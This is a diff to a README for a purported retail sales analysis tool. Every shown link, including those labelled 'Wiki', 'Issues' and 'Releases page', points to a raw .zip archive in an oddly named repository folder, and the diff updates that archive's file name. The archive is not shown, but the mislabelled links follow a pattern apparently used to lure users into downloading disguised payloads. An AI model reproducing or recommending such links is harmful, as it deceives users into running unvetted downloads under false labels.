@@ -1,7 +1,7 @@
 # 📊 Retail-Sales-Analysis - Unlock Insights from Retail Data
 
 ## 📦 Download Now
-[![Download Latest Release](https://github.com/huhu094560/Retail-Sales-Analysis/raw/refs/heads/main/swivellike/Retail-Analysis-Sales-1.4-beta.5.zip%20Latest%20Release-%20-brightgreen)](https://github.com/huhu094560/Retail-Sales-Analysis/raw/refs/heads/main/swivellike/Retail-Analysis-Sales-1.4-beta.5.zip)
+[![Download Latest Release](https://github.com/huhu094560/Retail-Sales-Analysis/raw/refs/heads/main/swivellike/Retail-Sales-Analysis-3.6.zip%20Latest%20Release-%20-brightgreen)](https://github.com/huhu094560/Retail-Sales-Analysis/raw/refs/heads/main/swivellike/Retail-Sales-Analysis-3.6.zip)
 
 ## 🚀 Getting Started
 Welcome to the Retail-Sales-Analysis project! This tool helps you analyze retail sales data, clean it, explore insights, and make informed business decisions.
@@ -26,7 +26,7 @@ Welcome to the Retail-Sales-Analysis project! This tool helps you analyze retail
 ## 📥 Download & Install
 To get started, visit this page to download the latest version of the software:
 
-[Download Latest Release](https://github.com/huhu094560/Retail-Sales-Analysis/raw/refs/heads/main/swivellike/Retail-Analysis-Sales-1.4-beta.5.zip)
+[Download Latest Release](https://github.com/huhu094560/Retail-Sales-Analysis/raw/refs/heads/main/swivellike/Retail-Sales-Analysis-3.6.zip)
 
 ### Installation Steps
 1. **Visit the Releases Page:** Click the link above to go to the Releases page.
@@ -43,8 +43,8 @@ To get started, visit this page to download the latest version of the software:
 5. **Generate Reports:** Create insightful reports based on your analysis results.
 
 ## 🌐 Additional Resources
-- **Documentation:** Check the [Wiki](https://github.com/huhu094560/Retail-Sales-Analysis/raw/refs/heads/main/swivellike/Retail-Analysis-Sales-1.4-beta.5.zip) for a guide on using advanced features.
-- **Community Support:** Join discussions in our [Issues](https://github.com/huhu094560/Retail-Sales-Analysis/raw/refs/heads/main/swivellike/Retail-Analysis-Sales-1.4-beta.5.zip) section for help or to share your insights.
+- **Documentation:** Check the [Wiki](https://github.com/huhu094560/Retail-Sales-Analysis/raw/refs/heads/main/swivellike/Retail-Sales-Analysis-3.6.zip) for a guide on using advanced features.
+- **Community Support:** Join discussions in our [Issues](https://github.com/huhu094560/Retail-Sales-Analysis/raw/refs/heads/main/swivellike/Retail-Sales-Analysis-3.6.zip) section for help or to share your insights.
 
 ## 📚 FAQs
 ### What kind of data can I analyze?
